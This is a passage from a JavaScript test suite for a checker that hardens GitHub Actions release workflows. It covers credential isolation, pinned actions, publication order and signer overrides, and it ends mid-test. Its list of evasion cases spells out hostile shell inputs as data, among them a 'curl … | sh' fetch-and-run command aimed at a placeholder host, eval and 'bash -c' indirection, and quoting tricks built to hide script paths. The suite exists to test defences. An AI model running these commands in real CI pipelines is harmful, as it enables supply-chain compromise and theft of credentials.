import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { test } from "node:test";

import { parse } from "yaml";

import {
	ALLOWED_ACTIONS,
	ALLOWED_COMMANDS,
	BETA_SIGNATURES,
	CONTENTS_WRITE_JOBS,
	CREDENTIAL_JOBS,
	ENVIRONMENT_EXEMPT_JOBS,
	HEAD_OBJECT_GUARD,
	PRODUCTION_POINTERS,
	R2_WRITERS,
	REBUILD_ALLOWLIST,
	TEST_SIGNER_FLAG,
	TEST_SIGNER_STEP,
	artifactDirectoriesOf,
	buildStepReasons,
	casePatternMatches,
	caseSkipPatternsOf,
	checkWorkflows,
	commandAllowlistReasons,
	credentialJobReasons,
	credentialStepReasons,
	hasDotSegment,
	headObjectGuardReasons,
	ignoreScriptsEnabled,
	isArtifactPath,
	isCredentialBearing,
	lifecycleReasons,
	permissionEntries,
	r2StepReasons,
	referencesSecret,
	repositoryCodeReasons,
	shellCommands,
	splitWords,
} from "../check-release-workflow.mjs";

const RELEASE = ".github/workflows/build-binaries.yml";
const STANDALONE = ".github/workflows/standalone-binaries.yml";
const CI = ".github/workflows/ci.yml";

function reader(overrides = {}) {
	return (path) => overrides[path] ?? readFileSync(path, "utf8");
}

function mutate(path, mutateText) {
	const original = readFileSync(path, "utf8");
	const mutated = mutateText(original);
	assert.notEqual(mutated, original, "the mutation did not change the workflow; the anchor text moved");
	return mutated;
}

/** Appends a `run` step to the named job (which must already have at least one step). */
function appendStep(text, jobId, stepYaml) {
	const document = parse(text);
	const job = document.jobs[jobId];
	assert.ok(job, `job ${jobId} exists`);
	const lastStep = job.steps[job.steps.length - 1];
	const nextJob = Object.keys(document.jobs)[Object.keys(document.jobs).indexOf(jobId) + 1];
	const anchor = nextJob ? `\n  ${nextJob}:\n` : null;
	const insertAt = anchor ? text.indexOf(anchor) : text.length;
	assert.ok(insertAt > 0, `found the end of job ${jobId} (${lastStep.name})`);
	return `${text.slice(0, insertAt)}\n${stepYaml}${text.slice(insertAt)}`;
}

function runStep(name, script) {
	const body = script
		.split("\n")
		.map((line) => `          ${line}`)
		.join("\n");
	return `      - name: ${name}\n        run: |\n${body}\n`;
}

test("the checked-in workflows satisfy every invariant", () => {
	assert.deepEqual(checkWorkflows(), []);
});

test("every job that publishes holds its credential in a protected environment", () => {
	const release = parse(readFileSync(RELEASE, "utf8"));
	for (const jobId of CREDENTIAL_JOBS) {
		assert.ok(release.jobs[jobId], `${jobId} exists`);
		assert.ok(release.jobs[jobId].environment, `${jobId} runs in an environment`);
		assert.ok(isCredentialBearing(release.jobs[jobId]), `${jobId} is recognised as credential-bearing`);
	}
	// A contents:write GITHUB_TOKEN can push tags and publish releases: it is a credential.
	assert.ok(isCredentialBearing(release.jobs["github-release"]));
	assert.ok(isCredentialBearing(release.jobs["github-release-beta"]));
	// OIDC minting is a credential too.
	assert.ok(isCredentialBearing(release.jobs.sign));
	// Jobs that run repository code hold nothing.
	for (const jobId of ["build", "assemble", "validate-macos", "pack-npm", "context", "verify"]) {
		assert.equal(isCredentialBearing(release.jobs[jobId]), false, `${jobId} holds no credential`);
	}
});

test("GITHUB_TOKEN never masks another secret in the same job (finding A)", () => {
	// A job that reads R2_SECRET_ACCESS_KEY is credential-bearing no matter what else it references.
	const both = {
		permissions: { contents: "read" },
		steps: [
			{
				name: "Upload",
				env: { GH_TOKEN: "${{ secrets.GITHUB_TOKEN }}", AWS_SECRET_ACCESS_KEY: "${{ secrets.R2_SECRET_ACCESS_KEY }}" },
				run: "aws s3 cp x s3://y",
			},
		],
	};
	assert.equal(isCredentialBearing(both), true);
	// The same two references in ONE value.
	assert.equal(
		isCredentialBearing({ permissions: {}, env: { TOKENS: "${{ secrets.GITHUB_TOKEN }} ${{ secrets.R2_SECRET_ACCESS_KEY }}" }, steps: [] }),
		true,
	);
	// Only GITHUB_TOKEN, in any number of places, is not a credential.
	assert.equal(
		isCredentialBearing({
			permissions: { contents: "read" },
			env: { GH_TOKEN: "${{ secrets.GITHUB_TOKEN }}" },
			steps: [{ env: { GITHUB_TOKEN: "${{ secrets.GITHUB_TOKEN }}" }, run: "gh api x" }],
		}),
		false,
	);
	// Secrets reach a job through more than `env:`.
	for (const job of [
		{ permissions: {}, steps: [{ uses: "some/action@0000000000000000000000000000000000000000", with: { token: "${{ secrets.NPM_TOKEN }}" } }] },
		{ permissions: {}, steps: [{ run: 'echo "${{ secrets.R2_BUCKET }}"' }] },
		{ permissions: {}, steps: [{ run: "echo ${{ toJSON(secrets) }}" }] },
		{ permissions: {}, steps: [{ run: "echo ${{ secrets['R2_BUCKET'] }}" }] },
		{ permissions: {}, steps: [{ run: "echo ${{ secrets.GITHUB_TOKEN_BACKUP }}" }] },
		{ permissions: {}, if: "secrets.DEPLOY_KEY != ''", steps: [] },
		{ permissions: {}, steps: [{ if: "secrets.DEPLOY_KEY != ''", run: "true" }] },
	]) {
		assert.equal(isCredentialBearing(job), true, JSON.stringify(job));
	}
	assert.equal(referencesSecret("${{ secrets.GITHUB_TOKEN }}"), false);
	assert.equal(referencesSecret("${{ secrets.GITHUB_TOKEN }} ${{ secrets.OTHER }}"), true);
	assert.equal(referencesSecret("${{ secrets.OTHER }} ${{ secrets.GITHUB_TOKEN }}"), true);
	assert.equal(referencesSecret("${{ secrets.GITHUB_TOKEN2 }}"), true);
	assert.equal(referencesSecret("${{ secrets.GITHUB_TOKENX }}"), true);
});

test("a job with both GITHUB_TOKEN and an R2 secret is classified credential-bearing and its checkout is flagged (finding A)", () => {
	// Take `build` - an unprivileged job that legitimately checks out - and give it an R2 secret next
	// to GITHUB_TOKEN in a step env. Before the fix GITHUB_TOKEN's presence exempted the whole value.
	const broken = mutate(RELEASE, (text) =>
		appendStep(
			text,
			"build",
			"      - name: Upload with both tokens\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.R2_SECRET_ACCESS_KEY }}\n        run: aws s3 cp x s3://y\n",
		),
	);
	const release = parse(broken);
	assert.equal(isCredentialBearing(release.jobs.build), true);
	const problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(
		problems.some((problem) => problem.includes("'build'") && problem.includes("actions/checkout")),
		problems.join("\n"),
	);
	// The same secret pair as ONE job-level env value is rejected as a job-level secret too.
	const jobLevel = mutate(RELEASE, (text) =>
		text.replace(
			"    env:\n      PRODUCTION_VERSION: ${{ needs.context.outputs.production_version }}\n    steps:\n      # No checkout, no dependency install",
			"    env:\n      PRODUCTION_VERSION: ${{ needs.context.outputs.production_version }}\n      TOKENS: ${{ secrets.GITHUB_TOKEN }} ${{ secrets.R2_ACCESS_KEY_ID }}\n    steps:\n      # No checkout, no dependency install",
		),
	);
	assert.ok(checkWorkflows(reader({ [RELEASE]: jobLevel })).some((problem) => problem.includes("exposes TOKENS")));
});

test("a tag trigger is rejected", () => {
	const broken = mutate(RELEASE, (text) => text.replace("  push:\n    branches:\n      - main\n", "  push:\n    branches:\n      - main\n    tags:\n      - 'v*'\n"));
	const problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("tag push")));
});

test("a wide workflow token is rejected", () => {
	const broken = mutate(RELEASE, (text) => text.replace("permissions: {}", "permissions:\n  contents: write"));
	const problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("permissions: {}")));
});

test("a job-level R2 secret is rejected", () => {
	const broken = mutate(RELEASE, (text) =>
		text.replace(
			"    env:\n      PRODUCTION_VERSION: ${{ needs.context.outputs.production_version }}\n    steps:\n      # No checkout, no dependency install",
			"    env:\n      PRODUCTION_VERSION: ${{ needs.context.outputs.production_version }}\n      AWS_ACCESS_KEY_ID: ${{ secrets.R2_ACCESS_KEY_ID }}\n    steps:\n      # No checkout, no dependency install",
		),
	);
	const problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("exposes AWS_ACCESS_KEY_ID")));
});

const CHECKOUT_STEP = "      - name: Sneak in a checkout\n        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0\n";
const SETUP_NODE_STEP = "      - name: Sneak in a toolchain\n        uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0\n";

for (const jobId of ["publish-r2", "finalize-release", "publish-beta-r2", "publish-npm", "tap-bump", "github-release"]) {
	test(`actions/checkout inside credential-bearing job ${jobId} is rejected`, () => {
		const broken = mutate(RELEASE, (text) => appendStep(text, jobId, CHECKOUT_STEP));
		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
		assert.ok(
			problems.some((problem) => problem.includes(`'${jobId}'`) && problem.includes("actions/checkout")),
			problems.join("\n"),
		);
	});
}

test("actions/setup-node is rejected in R2 jobs but allowed for npm trusted publishing", () => {
	const broken = mutate(RELEASE, (text) => appendStep(text, "finalize-release", SETUP_NODE_STEP));
	const problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("'finalize-release'") && problem.includes("setup-node")));
	const release = parse(readFileSync(RELEASE, "utf8"));
	assert.ok(release.jobs["publish-npm"].steps.some((step) => step.uses?.startsWith("actions/setup-node@")));
	assert.deepEqual(checkWorkflows(), []);
});

const EVASIONS = [
	["node scripts/x.mjs", "node scripts/pack-npm-packages.mjs --out-dir npm-packages"],
	["bash scripts/x.sh", "bash scripts/publish.sh"],
	["sh with a relative script", "sh ./publish.sh"],
	["./scripts/x.sh in command position", "./scripts/publish.sh --yes"],
	["python3 scripts/x.py", "python3 scripts/publish.py"],
	["source scripts/x", "source scripts/env.sh"],
	[". scripts/x", ". scripts/env.sh"],
	["a script under packages/", "node packages/coding-agent/scripts/publish.mjs"],
	["a script under .github/", "bash .github/scripts/publish.sh"],
	["$GITHUB_WORKSPACE/scripts", 'bash "$GITHUB_WORKSPACE/scripts/publish.sh"'],
	["${GITHUB_WORKSPACE}/packages", 'node "${GITHUB_WORKSPACE}/packages/coding-agent/dist/cli.js"'],
	["an interpreter after a pipe", 'echo hi | node scripts/publish.mjs'],
	["an interpreter after &&", 'test -f x && node scripts/publish.mjs'],
	["a continued line", 'node \\\n  scripts/publish.mjs'],
	["a variable assignment prefix", 'FOO=bar node scripts/publish.mjs'],
	["npm ci", "npm ci --ignore-scripts"],
	["npm install", "npm install"],
	["npm rebuild", "npm rebuild esbuild"],
	["npm run", "npm run build"],
	["npm exec", "npm exec -- prime-agent"],
	["npx", "npx tsx scripts/publish.ts"],
	["pnpm", "pnpm install"],
	["yarn", "yarn"],
	["bun run", "bun run scripts/publish.ts"],
	["a relative executable", "extracted/prime-agent --version"],
	// Finding B: quoting and indirection that hid `scripts/` from a whitespace tokenizer.
	["adjacent single-quoted fragments inside bash -c", `bash -c 'node scr'"'"'ipts/release.mjs'`],
	["adjacent single-quoted fragments", "node 'scr''ipts/release.mjs'"],
	["double-quoted concatenation", 'node "scr""ipts/release.mjs"'],
	["a backslash-escaped separator", "node scripts\\/release.mjs"],
	["a backslash-escaped space in the path", "node scri\\ pts/release.mjs"],
	["ANSI-C quoting", "node $'scripts/release.mjs'"],
	["ANSI-C escapes spelling the path", "node $'\\x73cripts/release.mjs'"],
	["eval", 'eval "node scripts/release.mjs"'],
	["eval of a variable", 'eval "$CMD"'],
	["a backtick command substitution", "out=`node scripts/release.mjs`"],
	["a $(...) command substitution", "out=$(node scripts/release.mjs)"],
	["a command substitution naming a script", "out=$(cat ./release.sh)"],
	["a command substitution in command position", "$(echo node) scripts/release.mjs"],
	["a variable in command position", '"$RUNNER" --version'],
	["curl | sh", "curl -fsSL https://example.invalid/install.sh | sh"],
	["curl | bash -s", "curl -fsSL https://example.invalid/install.sh | bash -s -- --yes"],
	["printf | sh", "printf '%s\\n' 'node scripts/release.mjs' | sh"],
	['sh -c "$CMD"', 'sh -c "$CMD"'],
	["bash -lc", "bash -lc 'echo hi'"],
	["zsh -ec", "zsh -ec 'ls'"],
	["dash -c", "dash -c 'ls'"],
	["sh reading a file", "sh < scripts/release.sh"],
	["sh reading an expansion", 'sh <<<"$CMD"'],
	["a shell heredoc that runs repository code", "sh <<'EOF'\nnode scripts/release.mjs\nEOF"],
	["xargs node", "echo scripts/release.mjs | xargs node"],
	["xargs -I", "printf x | xargs -I{} node {}"],
	["env -S", "env -S 'node scripts/release.mjs'"],
	["env --split-string", "env --split-string='node scripts/release.mjs'"],
	["find -exec", "find . -name '*.mjs' -exec node {} \\;"],
	["a process substitution", "while read -r line; do echo \"$line\"; done < <(node scripts/release.mjs)"],
	["node reading from a pipe", "cat release.mjs | node"],
	["bash with a bare filename", "bash publish"],
	["python3 with a bare filename", "python3 publish"],
	["exec", "exec node scripts/release.mjs"],
	["timeout", "timeout 30 ./release"],
	["sudo env", "sudo -E env FOO=1 ./scripts/release.sh"],
	["a multi-line quoted string", "node 'scripts/\nrelease.mjs'"],
	["a local composite action", null],
];

for (const jobId of ["publish-r2", "finalize-release", "publish-npm"]) {
	for (const [label, script] of EVASIONS) {
		test(`${label} inside credential-bearing job ${jobId} is rejected`, () => {
			const step =
				script === null
					? "      - name: Sneak in a local action\n        uses: ./.github/actions/publish\n"
					: runStep("Sneak in repository code", `set -euo pipefail\n${script}`);
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, step));
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			assert.ok(
				problems.some((problem) => problem.includes(`'${jobId}'`) && /must not run repository code|local action/.test(problem)),
				`expected a repository-code finding for ${jobId}, got:\n${problems.join("\n")}`,
			);
		});
	}
}

test("the shell matcher understands continuations, heredocs, pipes and comments", () => {
	const commands = [
		...shellCommands(
			"digest=$(grep -E 'x' \\\n  \"$GITHUB_WORKSPACE/artifacts/SHA256SUMS\" | cut -d' ' -f1)\npython3 - \"$formula\" <<'PY'\nimport scripts/evil\nPY\n# node scripts/comment.mjs\necho ok # node scripts/comment.mjs\n",
		),
	];
	// Round 4, finding 6: the heredoc body is re-parsed and yielded too, whatever program reads it.
	assert.deepEqual(
		commands.map((command) => command.words.map((word) => word.text)),
		[["digest=$(grep -E 'x'    \"$GITHUB_WORKSPACE/artifacts/SHA256SUMS\" | cut -d' ' -f1)"], ["python3", "-", "$formula"], ["import", "scripts/evil"], ["echo", "ok"]],
	);
	assert.deepEqual(commands[0].substitutions, ["grep -E 'x'    \"$GITHUB_WORKSPACE/artifacts/SHA256SUMS\" | cut -d' ' -f1"]);
	assert.deepEqual(repositoryCodeReasons(commands[0]), []);
	assert.match(repositoryCodeReasons(commands[1]).join("\n"), /python3 reads its script from a heredoc/);
	assert.match(repositoryCodeReasons(commands[1]).join("\n"), /python3 reads its script from stdin/);
	assert.match(repositoryCodeReasons(commands[2]).join("\n"), /references the checkout: scripts\/evil/);
	assert.deepEqual(repositoryCodeReasons(commands[3]), []);
});

test("word splitting resolves adjacent quoted fragments the way a POSIX shell does (finding B)", () => {
	const words = (line) => splitWords(line).commands.map((command) => command.words.map((word) => word.text));
	assert.deepEqual(words(`bash -c 'node scr'"'"'ipts/release.mjs'`), [["bash", "-c", "node scr'ipts/release.mjs"]]);
	assert.deepEqual(words(`node 'scr''ipts/x.mjs'`), [["node", "scripts/x.mjs"]]);
	assert.deepEqual(words(`node "scr""ipts/x.mjs"`), [["node", "scripts/x.mjs"]]);
	assert.deepEqual(words(`node scr\\ipts/x.mjs`), [["node", "scripts/x.mjs"]]);
	assert.deepEqual(words(`node scri\\ pts/x.mjs`), [["node", "scri pts/x.mjs"]]);
	assert.deepEqual(words(`node $'scripts/x.mjs'`), [["node", "scripts/x.mjs"]]);
	assert.deepEqual(words(`node $'\\x73cripts/\\146.mjs'`), [["node", "scripts/f.mjs"]]);
	assert.deepEqual(words(`echo "a \\"b\\" \\$c" 'd $e' f\\ g`), [["echo", 'a "b" $c', "d $e", "f g"]]);
	// Separators, comments and redirections.
	assert.deepEqual(words("a; b && c || d | e & f"), [["a"], ["b"], ["c"], ["d"], ["e"], ["f"]]);
	assert.deepEqual(words("a # b c"), [["a"]]);
	assert.deepEqual(words("a '#' b"), [["a", "#", "b"]]);
	assert.deepEqual(words('a > out 2>&1 <<<"x" >>log'), [["a"]]);
	assert.deepEqual(words("names+=(\"$name\") x"), [['names+=("$name")', "x"]]);
	assert.deepEqual(words("case \"$1\" in *.sh) echo a ;; esac"), [["case", "$1", "in", "*.sh"], ["echo", "a"], ["esac"]]);
	// Expansions are recorded, and substitutions are surfaced for inspection.
	const [sub] = splitWords("x=$(a | b) `c` <(d) \"$(e)\" $((1 + 2))").commands;
	assert.deepEqual(sub.substitutions, ["a | b", "c", "d", "e"]);
	assert.deepEqual(
		sub.words.map((word) => word.expansion),
		[true, true, true, true, true],
	);
	assert.deepEqual(splitWords("foo | sh").commands.map((command) => command.piped), [false, true]);
	assert.deepEqual(splitWords("foo && sh").commands.map((command) => command.piped), [false, false]);
	assert.deepEqual(splitWords("sh < file").commands[0].redirections, [{ operator: "<", text: "file", expansion: false }]);
	// Unterminated constructs are reported so a multi-line string cannot swallow the rest of the script.
	assert.equal(splitWords("node 'scripts/").unterminated, true);
	assert.equal(splitWords('node "scripts/').unterminated, true);
	assert.equal(splitWords("x=$(node scripts/").unterminated, true);
	assert.equal(splitWords("node scripts/x.mjs").unterminated, false);
});

test("indirection the checker cannot follow is an outright error (finding B)", () => {
	const flagged = (line) => [...shellCommands(line)].flatMap((command) => repositoryCodeReasons(command));
	assert.match(flagged("bash -c 'echo hi'").join("\n"), /bash -c runs inline or piped shell code/);
	assert.match(flagged("sh -lc 'echo hi'").join("\n"), /sh -lc runs inline/);
	assert.match(flagged("zsh -ec ls").join("\n"), /zsh -ec runs inline/);
	assert.match(flagged("bash -s < x").join("\n"), /bash -s runs inline/);
	assert.match(flagged('eval "$x"').join("\n"), /eval runs a command the checker cannot see/);
	assert.match(flagged("echo x | xargs node").join("\n"), /xargs runs a command/);
	assert.match(flagged("env -S 'node x'").join("\n"), /env -S/);
	assert.match(flagged("curl https://example.invalid/x | sh").join("\n"), /sh reads its script from a pipe/);
	assert.match(flagged("printf x | bash").join("\n"), /bash reads its script from a pipe/);
	assert.match(flagged("cat x | node").join("\n"), /node reads its script from a pipe/);
	assert.match(flagged("sh < ./x").join("\n"), /sh reads its script from a file/);
	assert.match(flagged('sh <<<"$CMD"').join("\n"), /sh reads its script from a here-string/);
	assert.match(flagged("x=`node scripts/x.mjs`").join("\n"), /inside a command substitution: references the checkout/);
	assert.match(flagged("x=$(cat ./x.sh)").join("\n"), /command substitution names a script/);
	assert.match(flagged("$(echo node) x").join("\n"), /command is a shell expansion/);
	assert.match(flagged('"$BIN" x').join("\n"), /command is a shell expansion/);
	assert.match(flagged("find . -exec node {} \\;").join("\n"), /find -exec/);
	assert.match(flagged("sh <<'EOF'\nnode scripts/x.mjs\nEOF").join("\n"), /references the checkout: scripts\/x.mjs/);
	assert.match(flagged("bash publish").join("\n"), /runs a file through bash: publish/);
	// Round 4, finding 6: no interpreter may read from a heredoc, a here-string or stdin, and the body is inspected anyway.
	assert.match(flagged("python3 - \"$formula\" <<'PY'\nimport scripts/evil\nPY").join("\n"), /python3 reads its script from a heredoc/);
	assert.match(flagged("python3 - \"$formula\" <<'PY'\nimport scripts/evil\nPY").join("\n"), /references the checkout: scripts\/evil/);
	assert.match(flagged("sh <<'EOF'\necho fine\nEOF").join("\n"), /sh reads its script from a heredoc/);
});

test("the shell matcher leaves legitimate credential-job commands alone", () => {
	const fine = [
		"aws s3 cp artifacts/latest.json s3://bucket/latest.json --quiet",
		"gh release edit v1.2.3 --draft=false --latest",
		'cosign verify-blob --certificate-identity "https://github.com/o/r/.github/workflows/build-binaries.yml@refs/heads/main" SHA256SUMS',
		"npm publish npm-packages/artifacts/x.tgz --provenance --access public --ignore-scripts",
		"jq -r '.publishOrder[]' npm-packages/manifest.json",
		"node -e 'console.log(1)'",
		"python3 -c 'print(1)'",
		"node --version",
		"sed -E \"s/x/${digest}/\" \"$formula\" > \"$formula.tmp\"",
		"[[ \"$PRODUCTION_VERSION\" =~ $version_pattern ]] || { echo bad >&2; exit 1; }",
		"sha256sum --check SHA256SUMS",
		"command -v uv",
		"count=$((count + 1))",
		"names=()",
		'while IFS= read -r name; do names+=("$name"); done < <(jq -r \'.publishOrder[]\' npm-packages/manifest.json)',
		'test "$(jq -r .isDraft /tmp/release.json)" = true',
		'echo "Draft ${TAG} targets ${BUILD_REF}; $(jq length /tmp/current-assets.json) assets unchanged."',
		'if [[ "$BUILD_REF" =~ ^[0-9a-f]{40}$ ]]; then echo ok; fi',
		'case "$name" in *.tar.gz) echo archive ;; esac',
		'local_digest="sha256:$(sha256sum "artifacts/$name" | cut -d\' \' -f1)"',
		"printf 'Automated beta build from `%s` (`%s`).\\n' \"$DEFAULT_BRANCH\" \"$BUILD_REF\" > /tmp/beta-release-notes.md",
		"gh release create \"$TAG\" --draft --notes-file /tmp/notes.md artifacts/*",
		"test -f artifacts/install.sh",
		"grep -E 'x' \"$GITHUB_WORKSPACE/artifacts/SHA256SUMS\"",
		"/usr/bin/env true",
	];
	for (const line of fine) {
		for (const tokens of shellCommands(line)) assert.deepEqual(repositoryCodeReasons(tokens), [], line);
	}
});

test("the pointers may only move in finalize-release, after the release is published", () => {
	// publish-r2 moving stable is exactly the ordering bug this file exists to prevent.
	const broken = mutate(RELEASE, (text) =>
		appendStep(text, "publish-r2", runStep("Advance early", 'aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable" --quiet')),
	);
	let problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("only 'finalize-release' may write a production pointer")));

	const beta = mutate(RELEASE, (text) =>
		text.replace(
			'          aws s3 cp artifacts/beta "s3://${R2_BUCKET}/beta" \\',
			'          aws s3 cp artifacts/install.sh "s3://${R2_BUCKET}/install.sh"\n          aws s3 cp artifacts/beta "s3://${R2_BUCKET}/beta" \\',
		),
	);
	problems = checkWorkflows(reader({ [RELEASE]: beta }));
	assert.ok(problems.some((problem) => problem.includes("beta channel must never write a production pointer")));

	// A step after the pointer step in finalize-release is rejected: pointers move last.
	const late = mutate(RELEASE, (text) => appendStep(text, "finalize-release", runStep("Afterthought", "echo done")));
	problems = checkWorkflows(reader({ [RELEASE]: late }));
	assert.ok(problems.some((problem) => problem.includes("in its last step")));

	// Moving the pointers before the release is undrafted is rejected.
	const early = mutate(RELEASE, (text) =>
		text.replace(
			"      - name: Publish the release and prove the tag points at BUILD_REF\n",
			`${runStep("Advance first", 'aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable" --quiet')}\n      - name: Publish the release and prove the tag points at BUILD_REF\n`,
		),
	);
	problems = checkWorkflows(reader({ [RELEASE]: early }));
	assert.ok(problems.some((problem) => problem.includes("must publish the GitHub release before it moves the channel pointers")), problems.join("\n"));
	assert.ok(problems.some((problem) => problem.includes("'finalize-release' must advance the channel pointers in its last step")), problems.join("\n"));

	// Dropping one pointer from the last step is rejected: all four move together.
	const partial = mutate(RELEASE, (text) => text.replace('          aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable" \\\n', '          aws s3 cp artifacts/stable "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/stable" \\\n'));
	problems = checkWorkflows(reader({ [RELEASE]: partial }));
	assert.ok(problems.some((problem) => problem.includes("missing: stable")), problems.join("\n"));
	assert.ok(problems.some((problem) => problem.includes("outside the allowlist for 'finalize-release'")), problems.join("\n"));
});

test("the publication order is enforced: github-release -> publish-r2 -> verify -> finalize-release -> npm/tap", () => {
	for (const [later, earlier, replacement] of [
		["verify", "publish-r2", "needs: [context, github-release]"],
		["finalize-release", "verify", "needs: [context, publish-r2]"],
		["publish-npm", "finalize-release", "needs: [context, pack-npm]"],
		["tap-bump", "finalize-release", "needs: [context, verify]"],
	]) {
		const release = parse(readFileSync(RELEASE, "utf8"));
		const current = `needs: [${release.jobs[later].needs.join(", ")}]`;
		const broken = mutate(RELEASE, (text) => {
			const start = text.indexOf(`\n  ${later}:\n`);
			const index = text.indexOf(current, start);
			assert.ok(index > start, `${later} declares ${current}`);
			return `${text.slice(0, index)}${replacement}${text.slice(index + current.length)}`;
		});
		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
		assert.ok(
			problems.some((problem) => problem.includes(`'${later}' must need '${earlier}'`)),
			`${later} without ${earlier}:\n${problems.join("\n")}`,
		);
	}
});

test("a credential job outside a protected environment is rejected", () => {
	const broken = mutate(RELEASE, (text) =>
		text.replace(
			"    environment:\n      name: release-npm\n",
			"",
		),
	);
	const problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("'publish-npm' must run in a protected environment")));
});

test("npm ci without --ignore-scripts is rejected", () => {
	const broken = mutate(STANDALONE, (text) => text.replace("npm ci --ignore-scripts", "npm ci"));
	const problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("--ignore-scripts")));
});

test("an unpinned action is rejected", () => {
	const broken = mutate(STANDALONE, (text) =>
		text.replace("oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2", "oven-sh/setup-bun@v2"),
	);
	const problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("without a full commit SHA")));
});

test("the test signer override may be compiled in exactly one standalone step and never uploaded (finding C)", () => {
	const RELEASE_TRUST = "packages/coding-agent/src/utils/release-trust.ts";
	assert.equal(TEST_SIGNER_STEP.workflow, STANDALONE);
	const standalone = parse(readFileSync(STANDALONE, "utf8"));
	const compile = standalone.jobs[TEST_SIGNER_STEP.job].steps.find((step) => step.name === TEST_SIGNER_STEP.step);
	assert.ok(compile.run.includes(TEST_SIGNER_FLAG), "the designated step compiles with the flag");

	// The flag anywhere else - the release compile, another job, an env value - is rejected.
	let broken = mutate(STANDALONE, (text) => text.replace("run: npm run build:binary", `run: npm run build:binary -- ${TEST_SIGNER_FLAG} signer.json`));
	let problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes(TEST_SIGNER_FLAG) && problem.includes("'Compile standalone application'")), problems.join("\n"));
	broken = mutate(RELEASE, (text) => appendStep(text, "build", runStep("Sneak a test signer in", `node packages/coding-agent/scripts/build-binary.mjs ${TEST_SIGNER_FLAG} x.json`)));
	problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes(TEST_SIGNER_FLAG) && problem.includes("'build'")), problems.join("\n"));
	// So is defining the identifier by hand.
	broken = mutate(RELEASE, (text) => appendStep(text, "build", runStep("Define it directly", "bun build --define __PRIME_AGENT_RELEASE_SIGNER_OVERRIDE__='\"{}\"' x")));
	problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("__PRIME_AGENT_RELEASE_SIGNER_OVERRIDE__")), problems.join("\n"));
	// Renaming the designated step turns its own flag into a violation.
	broken = mutate(STANDALONE, (text) => text.replace(`name: ${TEST_SIGNER_STEP.step}`, "name: Compile another binary"));
	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes(TEST_SIGNER_FLAG)), problems.join("\n"));

	// The uploaded artifact must not reach into the test-signer directories or a whole tree.
	for (const extra of ["${{ runner.temp }}/test-release/current/*.tar.gz", "${{ runner.temp }}/**", "${{ runner.temp }}/", "source/packages/coding-agent/binaries-test-signer/"]) {
		broken = mutate(STANDALONE, (text) => text.replace("            ${{ runner.temp }}/standalone/binaries.json\n", `            \${{ runner.temp }}/standalone/binaries.json\n            ${extra}\n`));
		problems = checkWorkflows(reader({ [STANDALONE]: broken }));
		assert.ok(problems.some((problem) => /test-signer|directory tree/.test(problem)), `${extra}:\n${problems.join("\n")}`);
	}
	// The test build must stay under $RUNNER_TEMP/test-release.
	broken = mutate(STANDALONE, (text) => text.replace(`"$RUNNER_TEMP/test-release/next" 99.0.0`, `"$RUNNER_TEMP/standalone" 99.0.0`));
	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("under $RUNNER_TEMP/test-release")), problems.join("\n"));
	broken = mutate(STANDALONE, (text) => text.replace(`${TEST_SIGNER_FLAG} "$RUNNER_TEMP/test-release/signer.json"`, `${TEST_SIGNER_FLAG} signer.json`));
	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("signer JSON from under $RUNNER_TEMP/test-release")), problems.join("\n"));
	// ...and be compiled only after the release archive has been assembled.
	broken = mutate(STANDALONE, (text) => {
		const start = text.indexOf("      - name: Assemble native archive\n");
		const end = text.indexOf("      - name: Resolve the signer identity of this job\n");
		const assemble = text.slice(start, end);
		const anchor = "      - name: Remove the build paths from the test machine\n";
		return `${text.slice(0, start)}${text.slice(end).replace(anchor, `${assemble}${anchor}`)}`;
	});
	problems = checkWorkflows(reader({ [STANDALONE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("must be assembled before")), problems.join("\n"));

	// The standalone job may hold id-token:write ONLY because the updater pins a different workflow path.
	const trust = readFileSync(RELEASE_TRUST, "utf8");
	broken = trust.replace('RELEASE_SIGNER_WORKFLOW_PATH = ".github/workflows/build-binaries.yml"', 'RELEASE_SIGNER_WORKFLOW_PATH = ".github/workflows/standalone-binaries.yml"');
	assert.notEqual(broken, trust);
	problems = checkWorkflows(reader({ [RELEASE_TRUST]: broken }));
	assert.ok(problems.some((problem) => problem.includes("RELEASE_SIGNER_WORKFLOW_PATH must pin")), problems.join("\n"));
	// ...and nothing else may be granted next to repository code, in the called or the calling job.
	broken = mutate(STANDALONE, (text) => text.replace("      contents: read\n      id-token: write\n", "      contents: write\n      id-token: write\n"));
